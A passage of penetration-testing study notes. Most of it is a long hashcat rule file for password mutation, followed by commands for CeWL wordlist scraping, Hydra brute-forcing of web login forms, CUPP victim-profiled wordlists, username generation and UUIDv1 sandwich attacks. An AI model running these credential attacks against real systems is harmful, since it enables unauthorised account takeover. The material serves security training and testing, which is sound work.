$1 $1 $! so0 sa@
$1 $1 $! c so0 sa@
$1 $2
$1 $2 c
$1 $2 c so0
$1 $2 sa@
$1 $2 c sa@
$1 $2 c sa@ so0
$1 $2 $!
$1 $2 $! c
$1 $2 $! so0
$1 $2 $! sa@
$1 $2 $! c so0
$1 $2 $! c sa@
$1 $2 $! so0 sa@
$1 $2 $! c so0 sa@
$1 $2 $3
$1 $2 $3 c
$1 $2 $3 c so0
$1 $2 $3 sa@
$1 $2 $3 c sa@
$1 $2 $3 c sa@ so0
$1 $2 $3 $!
$1 $2 $3 $! c
$1 $2 $3 $! so0
$1 $2 $3 $! sa@
$1 $2 $3 $! c so0
$1 $2 $3 $! c sa@
$1 $2 $3 $! so0 sa@
$1 $2 $3 $! c so0 sa@
$8 $0
$8 $0 c
$8 $0 c so0
$8 $0 sa@
$8 $0 c sa@
$8 $0 c sa@ so0
$8 $0 $!
$8 $0 $! c
$8 $0 $! so0
$8 $0 $! sa@
$8 $0 $! c so0
$8 $0 $! c sa@
$8 $0 $! so0 sa@
$8 $0 $! c so0 sa@
$8 $1
$8 $1 c
$8 $1 c so0
$8 $1 sa@
$8 $1 c sa@
$8 $1 c sa@ so0
$8 $1 $!
$8 $1 $! c
$8 $1 $! so0
$8 $1 $! sa@
$8 $1 $! c so0
$8 $1 $! c sa@
$8 $1 $! so0 sa@
$8 $1 $! c so0 sa@
$8 $2
$8 $2 c
$8 $2 c so0
$8 $2 sa@
$8 $2 c sa@
$8 $2 c sa@ so0
$8 $2 $!
$8 $2 $! c
$8 $2 $! so0
$8 $2 $! sa@
$8 $2 $! c so0
$8 $2 $! c sa@
$8 $2 $! so0 sa@
$8 $2 $! c so0 sa@
$8 $3
$8 $3 c
$8 $3 c so0
$8 $3 sa@
$8 $3 c sa@
$8 $3 c sa@ so0
$8 $3 $!
$8 $3 $! c
$8 $3 $! so0
$8 $3 $! sa@
$8 $3 $! c so0
$8 $3 $! c sa@
$8 $3 $! so0 sa@
$8 $3 $! c so0 sa@
$8 $4
$8 $4 c
$8 $4 c so0
$8 $4 sa@
$8 $4 c sa@
$8 $4 c sa@ so0
$8 $4 $!
$8 $4 $! c
$8 $4 $! so0
$8 $4 $! sa@
$8 $4 $! c so0
$8 $4 $! c sa@
$8 $4 $! so0 sa@
$8 $4 $! c so0 sa@
$8 $5
$8 $5 c
$8 $5 c so0
$8 $5 sa@
$8 $5 c sa@
$8 $5 c sa@ so0
$8 $5 $!
$8 $5 $! c
$8 $5 $! so0
$8 $5 $! sa@
$8 $5 $! c so0
$8 $5 $! c sa@
$8 $5 $! so0 sa@
$8 $5 $! c so0 sa@
$8 $6
$8 $6 c
$8 $6 c so0
$8 $6 sa@
$8 $6 c sa@
$8 $6 c sa@ so0
$8 $6 $!
$8 $6 $! c
$8 $6 $! so0
$8 $6 $! sa@
$8 $6 $! c so0
$8 $6 $! c sa@
$8 $6 $! so0 sa@
$8 $6 $! c so0 sa@
$8 $7
$8 $7 c
$8 $7 c so0
$8 $7 sa@
$8 $7 c sa@
$8 $7 c sa@ so0
$8 $7 $!
$8 $7 $! c
$8 $7 $! so0
$8 $7 $! sa@
$8 $7 $! c so0
$8 $7 $! c sa@
$8 $7 $! so0 sa@
$8 $7 $! c so0 sa@
$8 $8
$8 $8 c
$8 $8 c so0
$8 $8 sa@
$8 $8 c sa@
$8 $8 c sa@ so0
$8 $8 $!
$8 $8 $! c
$8 $8 $! so0
$8 $8 $! sa@
$8 $8 $! c so0
$8 $8 $! c sa@
$8 $8 $! so0 sa@
$8 $8 $! c so0 sa@
$8 $9
$8 $9 c
$8 $9 c so0
$8 $9 sa@
$8 $9 c sa@
$8 $9 c sa@ so0
$8 $9 $!
$8 $9 $! c
$8 $9 $! so0
$8 $9 $! sa@
$8 $9 $! c so0
$8 $9 $! c sa@
$8 $9 $! so0 sa@
$8 $9 $! c so0 sa@
$9 $0
$9 $0 c
$9 $0 c so0
$9 $0 sa@
$9 $0 c sa@
$9 $0 c sa@ so0 
$9 $0 $!
$9 $0 $! c
$9 $0 $! so0
$9 $0 $! sa@
$9 $0 $! c so0
$9 $0 $! c sa@
$9 $0 $! so0 sa@
$9 $0 $! c so0 sa@
$9 $1
$9 $1 c
$9 $1 c so0
$9 $1 sa@
$9 $1 c sa@
$9 $1 c sa@ so0 
$9 $1 $!
$9 $1 $! c
$9 $1 $! so0
$9 $1 $! sa@
$9 $1 $! c so0
$9 $1 $! c sa@
$9 $1 $! so0 sa@
$9 $1 $! c so0 sa@
$9 $2
$9 $2 c
$9 $2 c so0
$9 $2 sa@
$9 $2 c sa@
$9 $2 c sa@ so0 
$9 $2 $!
$9 $2 $! c
$9 $2 $! so0
$9 $2 $! sa@
$9 $2 $! c so0
$9 $2 $! c sa@
$9 $2 $! so0 sa@
$9 $2 $! c so0 sa@
$9 $3
$9 $3 c
$9 $3 c so0
$9 $3 sa@
$9 $3 c sa@
$9 $3 c sa@ so0 
$9 $3 $!
$9 $3 $! c
$9 $3 $! so0
$9 $3 $! sa@
$9 $3 $! c so0
$9 $3 $! c sa@
$9 $3 $! so0 sa@
$9 $3 $! c so0 sa@
$9 $4
$9 $4 c
$9 $4 c so0
$9 $4 sa@
$9 $4 c sa@
$9 $4 c sa@ so0 
$9 $4 $!
$9 $4 $! c
$9 $4 $! so0
$9 $4 $! sa@
$9 $4 $! c so0
$9 $4 $! c sa@
$9 $4 $! so0 sa@
$9 $4 $! c so0 sa@
$9 $5
$9 $5 c
$9 $5 c so0
$9 $5 sa@
$9 $5 c sa@
$9 $5 c sa@ so0 
$9 $5 $!
$9 $5 $! c
$9 $5 $! so0
$9 $5 $! sa@
$9 $5 $! c so0
$9 $5 $! c sa@
$9 $5 $! so0 sa@
$9 $5 $! c so0 sa@
$9 $6
$9 $6 c
$9 $6 c so0
$9 $6 sa@
$9 $6 c sa@
$9 $6 c sa@ so0 
$9 $6 $!
$9 $6 $! c
$9 $6 $! so0
$9 $6 $! sa@
$9 $6 $! c so0
$9 $6 $! c sa@
$9 $6 $! so0 sa@
$9 $6 $! c so0 sa@
$9 $7
$9 $7 c
$9 $7 c so0
$9 $7 sa@
$9 $7 c sa@
$9 $7 c sa@ so0 
$9 $7 $!
$9 $7 $! c
$9 $7 $! so0
$9 $7 $! sa@
$9 $7 $! c so0
$9 $7 $! c sa@
$9 $7 $! so0 sa@
$9 $7 $! c so0 sa@
$9 $8
$9 $8 c
$9 $8 c so0
$9 $8 sa@
$9 $8 c sa@
$9 $8 c sa@ so0 
$9 $8 $!
$9 $8 $! c
$9 $8 $! so0
$9 $8 $! sa@
$9 $8 $! c so0
$9 $8 $! c sa@
$9 $8 $! so0 sa@
$9 $8 $! c so0 sa@
$9 $9
$9 $9 c
$9 $9 c so0
$9 $9 sa@
$9 $9 c sa@
$9 $9 c sa@ so0 
$9 $9 $!
$9 $9 $! c
$9 $9 $! so0
$9 $9 $! sa@
$9 $9 $! c so0
$9 $9 $! c sa@
$9 $9 $! so0 sa@
$9 $9 $! c so0 sa@
$2 $0 $0 $0
$2 $0 $0 $0 c
$2 $0 $0 $0 c so0
$2 $0 $0 $0 sa@
$2 $0 $0 $0 c sa@
$2 $0 $0 $0 c sa@ so0
$2 $0 $0 $0 $!
$2 $0 $0 $0 $! c
$2 $0 $0 $0 $! so0
$2 $0 $0 $0 $! sa@
$2 $0 $0 $0 $! c so0
$2 $0 $0 $0 $! c sa@
$2 $0 $0 $0 $! so0 sa@
$2 $0 $0 $0 $! c so0 sa@
$2 $0 $0 $1
$2 $0 $0 $1 c
$2 $0 $0 $1 c so0
$2 $0 $0 $1 sa@
$2 $0 $0 $1 c sa@
$2 $0 $0 $1 c sa@ so0
$2 $0 $0 $1 $!
$2 $0 $0 $1 $! c
$2 $0 $0 $1 $! so0
$2 $0 $0 $1 $! sa@
$2 $0 $0 $1 $! c so0
$2 $0 $0 $1 $! c sa@
$2 $0 $0 $1 $! so0 sa@
$2 $0 $0 $1 $! c so0 sa@
$2 $0 $0 $2
$2 $0 $0 $2 c
$2 $0 $0 $2 c so0
$2 $0 $0 $2 sa@
$2 $0 $0 $2 c sa@
$2 $0 $0 $2 c sa@ so0
$2 $0 $0 $2 $!
$2 $0 $0 $2 $! c
$2 $0 $0 $2 $! so0
$2 $0 $0 $2 $! sa@
$2 $0 $0 $2 $! c so0
$2 $0 $0 $2 $! c sa@
$2 $0 $0 $2 $! so0 sa@
$2 $0 $0 $2 $! c so0 sa@
$2 $0 $0 $3
$2 $0 $0 $3 c
$2 $0 $0 $3 c so0
$2 $0 $0 $3 sa@
$2 $0 $0 $3 c sa@
$2 $0 $0 $3 c sa@ so0
$2 $0 $0 $3 $!
$2 $0 $0 $3 $! c
$2 $0 $0 $3 $! so0
$2 $0 $0 $3 $! sa@
$2 $0 $0 $3 $! c so0
$2 $0 $0 $3 $! c sa@
$2 $0 $0 $3 $! so0 sa@
$2 $0 $0 $3 $! c so0 sa@
$2 $0 $0 $4
$2 $0 $0 $4 c
$2 $0 $0 $4 c so0
$2 $0 $0 $4 sa@
$2 $0 $0 $4 c sa@
$2 $0 $0 $4 c sa@ so0
$2 $0 $0 $4 $!
$2 $0 $0 $4 $! c
$2 $0 $0 $4 $! so0
$2 $0 $0 $4 $! sa@
$2 $0 $0 $4 $! c so0
$2 $0 $0 $4 $! c sa@
$2 $0 $0 $4 $! so0 sa@
$2 $0 $0 $4 $! c so0 sa@
$2 $0 $0 $5
$2 $0 $0 $5 c
$2 $0 $0 $5 c so0
$2 $0 $0 $5 sa@
$2 $0 $0 $5 c sa@
$2 $0 $0 $5 c sa@ so0
$2 $0 $0 $5 $!
$2 $0 $0 $5 $! c
$2 $0 $0 $5 $! so0
$2 $0 $0 $5 $! sa@
$2 $0 $0 $5 $! c so0
$2 $0 $0 $5 $! c sa@
$2 $0 $0 $5 $! so0 sa@
$2 $0 $0 $5 $! c so0 sa@
$2 $0 $0 $6
$2 $0 $0 $6 c
$2 $0 $0 $6 c so0
$2 $0 $0 $6 sa@
$2 $0 $0 $6 c sa@
$2 $0 $0 $6 c sa@ so0
$2 $0 $0 $6 $!
$2 $0 $0 $6 $! c
$2 $0 $0 $6 $! so0
$2 $0 $0 $6 $! sa@
$2 $0 $0 $6 $! c so0
$2 $0 $0 $6 $! c sa@
$2 $0 $0 $6 $! so0 sa@
$2 $0 $0 $6 $! c so0 sa@
$2 $0 $0 $7
$2 $0 $0 $7 c
$2 $0 $0 $7 c so0
$2 $0 $0 $7 sa@
$2 $0 $0 $7 c sa@
$2 $0 $0 $7 c sa@ so0
$2 $0 $0 $7 $!
$2 $0 $0 $7 $! c
$2 $0 $0 $7 $! so0
$2 $0 $0 $7 $! sa@
$2 $0 $0 $7 $! c so0
$2 $0 $0 $7 $! c sa@
$2 $0 $0 $7 $! so0 sa@
$2 $0 $0 $7 $! c so0 sa@
$2 $0 $0 $8
$2 $0 $0 $8 c
$2 $0 $0 $8 c so0
$2 $0 $0 $8 sa@
$2 $0 $0 $8 c sa@
$2 $0 $0 $8 c sa@ so0
$2 $0 $0 $8 $!
$2 $0 $0 $8 $! c
$2 $0 $0 $8 $! so0
$2 $0 $0 $8 $! sa@
$2 $0 $0 $8 $! c so0
$2 $0 $0 $8 $! c sa@
$2 $0 $0 $8 $! so0 sa@
$2 $0 $0 $8 $! c so0 sa@
$2 $0 $0 $9
$2 $0 $0 $9 c
$2 $0 $0 $9 c so0
$2 $0 $0 $9 sa@
$2 $0 $0 $9 c sa@
$2 $0 $0 $9 c sa@ so0
$2 $0 $0 $9 $!
$2 $0 $0 $9 $! c
$2 $0 $0 $9 $! so0
$2 $0 $0 $9 $! sa@
$2 $0 $0 $9 $! c so0
$2 $0 $0 $9 $! c sa@
$2 $0 $0 $9 $! so0 sa@
$2 $0 $0 $9 $! c so0 sa@
$2 $0 $1 $0
$2 $0 $1 $0 c
$2 $0 $1 $0 c so0
$2 $0 $1 $0 sa@
$2 $0 $1 $0 c sa@
$2 $0 $1 $0 c sa@ so0
$2 $0 $1 $0 $!
$2 $0 $1 $0 $! c
$2 $0 $1 $0 $! so0
$2 $0 $1 $0 $! sa@
$2 $0 $1 $0 $! c so0
$2 $0 $1 $0 $! c sa@
$2 $0 $1 $0 $! so0 sa@
$2 $0 $1 $0 $! c so0 sa@
$2 $0 $1 $1
$2 $0 $1 $1 c
$2 $0 $1 $1 c so0
$2 $0 $1 $1 sa@
$2 $0 $1 $1 c sa@
$2 $0 $1 $1 c sa@ so0
$2 $0 $1 $1 $!
$2 $0 $1 $1 $! c
$2 $0 $1 $1 $! so0
$2 $0 $1 $1 $! sa@
$2 $0 $1 $1 $! c so0
$2 $0 $1 $1 $! c sa@
$2 $0 $1 $1 $! so0 sa@
$2 $0 $1 $1 $! c so0 sa@
$2 $0 $1 $2
$2 $0 $1 $2 c
$2 $0 $1 $2 c so0
$2 $0 $1 $2 sa@
$2 $0 $1 $2 c sa@
$2 $0 $1 $2 c sa@ so0
$2 $0 $1 $2 $!
$2 $0 $1 $2 $! c
$2 $0 $1 $2 $! so0
$2 $0 $1 $2 $! sa@
$2 $0 $1 $2 $! c so0
$2 $0 $1 $2 $! c sa@
$2 $0 $1 $2 $! so0 sa@
$2 $0 $1 $2 $! c so0 sa@
$2 $0 $1 $3
$2 $0 $1 $3 c
$2 $0 $1 $3 c so0
$2 $0 $1 $3 sa@
$2 $0 $1 $3 c sa@
$2 $0 $1 $3 c sa@ so0
$2 $0 $1 $3 $!
$2 $0 $1 $3 $! c
$2 $0 $1 $3 $! so0
$2 $0 $1 $3 $! sa@
$2 $0 $1 $3 $! c so0
$2 $0 $1 $3 $! c sa@
$2 $0 $1 $3 $! so0 sa@
$2 $0 $1 $3 $! c so0 sa@
$2 $0 $1 $4
$2 $0 $1 $4 c
$2 $0 $1 $4 c so0
$2 $0 $1 $4 sa@
$2 $0 $1 $4 c sa@
$2 $0 $1 $4 c sa@ so0
$2 $0 $1 $4 $!
$2 $0 $1 $4 $! c
$2 $0 $1 $4 $! so0
$2 $0 $1 $4 $! sa@
$2 $0 $1 $4 $! c so0
$2 $0 $1 $4 $! c sa@
$2 $0 $1 $4 $! so0 sa@
$2 $0 $1 $4 $! c so0 sa@
$2 $0 $1 $5
$2 $0 $1 $5 c
$2 $0 $1 $5 c so0
$2 $0 $1 $5 sa@
$2 $0 $1 $5 c sa@
$2 $0 $1 $5 c sa@ so0
$2 $0 $1 $5 $!
$2 $0 $1 $5 $! c
$2 $0 $1 $5 $! so0
$2 $0 $1 $5 $! sa@
$2 $0 $1 $5 $! c so0
$2 $0 $1 $5 $! c sa@
$2 $0 $1 $5 $! so0 sa@
$2 $0 $1 $5 $! c so0 sa@
$2 $0 $1 $6
$2 $0 $1 $6 c
$2 $0 $1 $6 c so0
$2 $0 $1 $6 sa@
$2 $0 $1 $6 c sa@
$2 $0 $1 $6 c sa@ so0
$2 $0 $1 $6 $!
$2 $0 $1 $6 $! c
$2 $0 $1 $6 $! so0
$2 $0 $1 $6 $! sa@
$2 $0 $1 $6 $! c so0
$2 $0 $1 $6 $! c sa@
$2 $0 $1 $6 $! so0 sa@
$2 $0 $1 $6 $! c so0 sa@
$2 $0 $1 $7
$2 $0 $1 $7 c
$2 $0 $1 $7 c so0
$2 $0 $1 $7 sa@
$2 $0 $1 $7 c sa@
$2 $0 $1 $7 c sa@ so0
$2 $0 $1 $7 $!
$2 $0 $1 $7 $! c
$2 $0 $1 $7 $! so0
$2 $0 $1 $7 $! sa@
$2 $0 $1 $7 $! c so0
$2 $0 $1 $7 $! c sa@
$2 $0 $1 $7 $! so0 sa@
$2 $0 $1 $7 $! c so0 sa@
$2 $0 $1 $8
$2 $0 $1 $8 c
$2 $0 $1 $8 c so0
$2 $0 $1 $8 sa@
$2 $0 $1 $8 c sa@
$2 $0 $1 $8 c sa@ so0
$2 $0 $1 $8 $!
$2 $0 $1 $8 $! c
$2 $0 $1 $8 $! so0
$2 $0 $1 $8 $! sa@
$2 $0 $1 $8 $! c so0
$2 $0 $1 $8 $! c sa@
$2 $0 $1 $8 $! so0 sa@
$2 $0 $1 $8 $! c so0 sa@
$2 $0 $1 $9
$2 $0 $1 $9 c
$2 $0 $1 $9 c so0
$2 $0 $1 $9 sa@
$2 $0 $1 $9 c sa@
$2 $0 $1 $9 c sa@ so0
$2 $0 $1 $9 $!
$2 $0 $1 $9 $! c
$2 $0 $1 $9 $! so0
$2 $0 $1 $9 $! sa@
$2 $0 $1 $9 $! c so0
$2 $0 $1 $9 $! c sa@
$2 $0 $1 $9 $! so0 sa@
$2 $0 $1 $9 $! c so0 sa@
$2 $0 $2 $0
$2 $0 $2 $0 c
$2 $0 $2 $0 c so0
$2 $0 $2 $0 sa@
$2 $0 $2 $0 c sa@
$2 $0 $2 $0 c sa@ so0
$2 $0 $2 $0 $!
$2 $0 $2 $0 $! c
$2 $0 $2 $0 $! so0
$2 $0 $2 $0 $! sa@
$2 $0 $2 $0 $! c so0
$2 $0 $2 $0 $! c sa@
$2 $0 $2 $0 $! so0 sa@
$2 $0 $2 $0 $! c so0 sa@
$2 $0 $2 $1
$2 $0 $2 $1 c
$2 $0 $2 $1 c so0
$2 $0 $2 $1 sa@
$2 $0 $2 $1 c sa@
$2 $0 $2 $1 c sa@ so0
$2 $0 $2 $1 $!
$2 $0 $2 $1 $! c
$2 $0 $2 $1 $! so0
$2 $0 $2 $1 $! sa@
$2 $0 $2 $1 $! c so0
$2 $0 $2 $1 $! c sa@
$2 $0 $2 $1 $! so0 sa@
$2 $0 $2 $1 $! c so0 sa@
$2 $0 $2 $2
$2 $0 $2 $2 c
$2 $0 $2 $2 c so0
$2 $0 $2 $2 sa@
$2 $0 $2 $2 c sa@
$2 $0 $2 $2 c sa@ so0
$2 $0 $2 $2 $!
$2 $0 $2 $2 $! c
$2 $0 $2 $2 $! so0
$2 $0 $2 $2 $! sa@
$2 $0 $2 $2 $! c so0
$2 $0 $2 $2 $! c sa@
$2 $0 $2 $2 $! so0 sa@
$2 $0 $2 $2 $! c so0 sa@
```
Hashcat will apply the rules of `custom.rule` for each word in `password.list` and store the mutated version in our `mut_password.list` accordingly. We might the [best64.rule](https://github.com/samirettali/password-cracking-rules/blob/master/best64.rule) too
```bash
# List all available hashcat's rules
ls /usr/share/hashcat/rules/
```
Thus, one word will result in fifteen mutated words in this case.
```bash
# Create passwords according to the custom rule
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```
Another tool called [CeWL](https://github.com/digininja/CeWL) to scan potential words from the company's website and save them in a separate list. We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password. We specify some parameters, like the depth to spider (`-d`), the minimum length of the word (`-m`), the storage of the found words in lowercase (`--lowercase`), as well as the file where we want to store the results (`-w`).
```bash
# Create custom company's passwords. Be careful w/ CeWL to remove some HTML passwords (useless)
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
wc -l inlane.wordlist

326
```



# Hydra
[https://github.com/frizb/Hydra-Cheatsheet](https://github.com/frizb/Hydra-Cheatsheet)
```bash
# Hydra supported services
hydra -h | grep "Supported services" | tr ":" "\\n" | tr " " "\\n" | column -e

Supported                       icq                             pop3[s]                         smtp-enum
services                        imap[s]                         postgres                        snmp
adam6500                        irc                             radmin2                         socks5
asterisk                        ldap2[s]                        rdp                             ssh
cisco                           ldap3[-{cram|digest}md5][s]     redis                           sshkey
cisco-enable                    memcached                       rexec                           svn
cobaltstrike                    mongodb                         rlogin                          teamspeak
cvs                             mssql                           rpcap                           telnet[s]
firebird                        mysql                           rsh                             vmauthd
ftp[s]                          nntp                            rtsp                            vnc
http[s]-{head|get|post}         oracle-listener                 s7-300                          xmpp
http[s]-{get|post}-form         oracle-sid                      sip
http-proxy                      pcanywhere                      smb
http-proxy-urlenum              pcnfs                           smtp[s]
```
## Brute Forcing Basic HTTP Authentication
```bash
# Hydra http-post-form default structure
hydra [options] target http-post-form "path:params:condition_string"

# Bruteforcing Web Login Form using POST request
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# Bruteforcing Web Login Form using GET request
hydra -l admin -P passwords.txt www.example.com http-get "/login:user=^USER^&pass=^PASS^:S=302"
```
## Web Forms Brute Forcing

We need to provide three parameters, separated by `:`
- `URL path`, which holds the login form
- `POST parameters` for username/password

We can find the parameters either capturing a login request w/ Burp, or via the browser using the Network Tools, by right-clicking on a login request and select `Copy` > `Copy POST data`

- `A failed/success login string`, which lets hydra recognize whether the login attempt was successful or not

We can specify two different types of `failed/success strings` that act as a Boolean value.

|**Type**|**Boolean Value**|**Flag**|
|---|---|---|
|`Fail`|FALSE|`F=html_content`|
|`Success`|TRUE|`S=html_content`|

If we provide a `fail` string, it will keep looking until the string is **not found** in the response. Another way is if we provide a `success` string, it will keep looking until the string is **found** in the response. So we can look at the HTML source code to find a parameter that may not be present after login, like the `login button` or the `password field`
```bash
"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"
```

```bash
# Brute force web forms using default creds
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

# Web forms password Attack 
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```



# Wordlists
[Weakpass](https://weakpass.com/)
[https://github.com/berzerk0/Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists)
```bash
# Default password wordlist
/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

```bash
# Default username wordlist
/opt/useful/SecLists/Usernames/Names/names.txt
```

```bash
# Default credentials wordlist
/opt/useful/SecLists/Passwords/Default-Credentials/
```
## Custom Passwords Wordlist
[Cupp](https://github.com/Mebus/cupp) is a tool to create custom wordlists based on a user information (birth date, name, surname…)
```bash
# Open in interactive mode
cupp -i

___________
   cupp.py!                 # Common
      \\                     # User
       \\   ,__,             # Passwords
        \\  (oo)____         # Profiler
           (__)    )\\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | <https://github.com/Mebus/>]

[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: William
> Surname: Gates
> Nickname: Bill
> Birthdate (DDMMYYYY): 28101955

> Partners) name: Melinda
> Partners) nickname: Ann
> Partners) birthdate (DDMMYYYY): 15081964

> Child's name: Jennifer
> Child's nickname: Jenn
> Child's birthdate (DDMMYYYY): 26041996

> Pet's name: Nila
> Company name: Microsoft

> Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to william.txt, counting 43368 words.
[+] Now load your pistolero with william.txt and shoot! Good luck!
```
Our custom wordlist is saved as `william.txt`
### Password Policy
The personalized password wordlist we generated is about 43,000 lines long. Since we saw the password policy when we logged in, we know that the password must meet the following conditions :
1. 8 characters or longer
2. contains special characters
3. contains numbers
So, we can remove any passwords that do not meet these conditions from our wordlist. Some tools would convert password policies to `Hashcat` or `John` rules
```bash
 # remove passwords shorter than 8
sed -ri '/^.{,7}$/d' william.txt
# remove passwords w/ no special chars         
sed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt
# remove passwords w/ no numbers
sed -ri '/[0-9]+/!d' william.txt
```
The wordlist is now shorter.
### Mangling
Many great tools do word mangling and case permutation quickly and easily, like [rsmangler](https://github.com/digininja/RSMangler) or [The Mentalist](https://github.com/sc0tfree/mentalist.git). These tools have many other options, which can make any small wordlist reach millions of lines long.
## Custom Username Wordlist
When dealing with a seemingly simple name like "Jane Smith," manual username generation can quickly become a convoluted endeavor. While the obvious combinations like `jane`, `smith`, `janesmith`, `j.smith`, or `jane.s` may seem adequate, they barely scratch the surface of the potential username landscape. This is where [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) shines. It accounts for initials, common substitutions, and more, casting a wider net in your quest to uncover the target's username :
```bash
# Install username-anarchy
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy -l

Plugin name             Example
--------------------------------------------------------------------------------
first                   anna
firstlast               annakey
first.last              anna.key
firstlast[8]            annakey
first[4]last[4]         annakey
firstl                  annak
f.last                  a.key
flast                   akey
lfirst                  kanna
l.first                 k.anna
lastf                   keya
last                    key
last.f                  key.a
last.first              key.anna
FLast                   AKey
first1                  anna0,anna1,anna2
fl                      ak
fmlast                  abkey
firstmiddlelast         annaboomkey
fml                     abk
FL                      AK
FirstLast               AnnaKey
First.Last              Anna.Key
Last                    Key
```

```bash
# Execute username-anarchy w/ First name + Last name of the target
./username-anarchy Jane Smith > jane_smith_usernames.txt
```
Upon inspecting `jane_smith_usernames.txt`, you'll encounter a diverse array of usernames, encompassing :
- Basic combinations: `janesmith`, `smithjane`, `jane.smith`, `j.smith`, etc.
- Initials: `js`, `j.s.`, `s.j.`, etc.
- etc
This comprehensive list, tailored to the target's name, is valuable in a brute-force attack.

# UUIDv1 Sandwich Attacks
Over time, several versions of UUIDs have been defined, each with its own approach : 
- `UUIDv1` is based on timestamps and the machine’s MAC address, making IDs unique but also unintentionally revealing details about when and where they were created.
- `UUIDv2` is a lesser-known variant that combines timestamps with system identifiers like POSIX user IDs. It never gained much popularity and is rarely used in practice today.
- `UUIDv3` and UUIDv5 generate deterministic IDs by hashing names and namespaces, ensuring that the same input always produces the same identifier.
- `UUIDv4`, the most widely used today, skips timestamps and hardware info entirely and instead relies on randomness to generate unique IDs.

The `third packet` of a uuid indicated his version
b1dcb8b6-b6ec-`1`1ed-b65e-455c57e26a3b -> version 1
573dfb54-c21a-`4`03c-ba7d-822635737450 -> version 4

We can find example of exploitation [here](https://realizesec.com/blog/sandwich-attacks-exploiting-uuid-v1)

The [GUIDTool](https://github.com/intruder-io/guidtool) can inspect and predict uuidv1 values for us. It is used to analyse version 1 GUIDs/UUIDs from a system. With the information obtained from analysis, it is often possible to **forge future v1 GUIDs** created by the system, if we know the **approximate time** they were created.

Another tool made from [Lupin](https://github.com/Lupin-Holmes/sandwich) can be used to do the sandwich attack. If we can retrieve 2 uuids version 1, we can try to guess the ones between them. 
